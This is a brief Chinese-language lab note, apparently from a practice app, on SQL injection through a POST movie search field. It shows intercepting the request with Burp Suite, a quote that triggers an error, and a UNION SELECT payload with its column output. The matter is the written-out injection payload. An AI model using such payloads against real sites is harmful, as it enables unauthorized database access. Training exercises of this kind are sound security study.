# sql 注入 Post Search 

## 调查

Post肯定需要BrupSuite抓包修改,尝试修改

空修改为 Iron' 发现了熟悉的报错,我们断定其实post和get后端的代码一样,继续测试

=Iron'union select 1,2,3,4,5,6,7-- -

发现返回 

```
Title 	Release 	Character 	Genre 	IMDb
2 	3 	5 	4 	Link
```

说明成功注入

后续步骤与get一致即可
